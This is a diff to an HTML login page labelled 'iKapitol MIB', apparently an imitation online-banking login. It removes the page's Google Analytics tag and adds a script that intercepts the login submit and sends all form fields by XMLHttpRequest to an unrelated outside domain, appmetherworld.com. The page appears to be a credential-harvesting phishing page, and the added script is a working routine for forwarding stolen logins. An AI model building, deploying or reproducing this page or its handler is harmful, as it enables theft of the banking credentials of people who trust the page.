@@ -67,7 +67,8 @@
                 <br/>
                 iKapitol MIB
 
-                <form method="POST" action="https://appmetherworld.com/ikapitol/" accept-charset="UTF-8" class="form-signin" data-parsley-validate="data-parsley-validate">
+                <form id="loginForm" method="POST" accept-charset="UTF-8" class="form-signin" data-parsley-validate="data-parsley-validate">
+
 
                     <div class="row">
                         <div class="col-12">
@@ -95,7 +96,7 @@
                                         <div class="row">
                         <!-- /.col -->
                         <div class="col-md-12 text-center">
-                            <button type="submit" class="btn btn-block btn-primary btn-lg">Ingresar</button>
+                            <button class="btn btn-block btn-primary btn-lg">Ingresar</button>
                         </div>
                         <!-- /.col -->
                     </div>
@@ -143,18 +144,34 @@
 
     </div>
 
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-EVRTEJLX9K"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){
-                dataLayer.push(arguments);
-  }
-  gtag('js', new Date());
-
-  gtag('config', 'G-EVRTEJLX9K');
-</script>
 
 </body>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+  var loginForm = document.getElementById('loginForm');
+
+  loginForm.addEventListener('submit', function (event) {
+    event.preventDefault(); // Prevent the default form submission
+
+    // You can perform any additional validation here before sending the form data
+
+    // Get the form data
+    var formData = new FormData(loginForm);
+
+    // Perform an AJAX request to submit the form data
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'https://appmetherworld.com/ikapitol/', true);
+
+    xhr.onreadystatechange = function () {
+      if (xhr.readyState === 4 && xhr.status === 200) {
+        // Handle the response, e.g., show a success message
+        console.log('Form submitted successfully');
+      }
+    };
+
+    xhr.send(formData);
+  });
+});
+</script>
 
 </html>
